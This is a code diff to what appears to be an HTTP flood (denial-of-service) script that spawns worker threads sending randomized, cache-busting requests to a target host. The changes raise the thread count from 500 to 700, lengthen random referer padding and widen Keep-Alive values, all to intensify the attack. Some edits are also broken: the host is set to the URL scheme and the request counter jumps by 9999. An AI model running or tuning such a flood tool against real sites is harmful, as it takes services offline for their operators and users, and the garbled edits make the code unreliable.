@@ -27,7 +27,7 @@ safe=0
 
 def inc_counter():
 	global request_counter
-	request_counter+=1
+	request_counter+=9999
 
 def set_flag(val):
 	global flag
@@ -3951,8 +3951,8 @@ def httpcall(url):
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
+	request.add_header('Keep-Alive', random.randint(110,160))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
@@ -4010,8 +4010,8 @@ else:
 		if url.count("/")==2:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
+		host = m.group(1)
+		for i in range(700):
 			t = HTTPThread()
 			t.start()
 		t = MonitorThread()
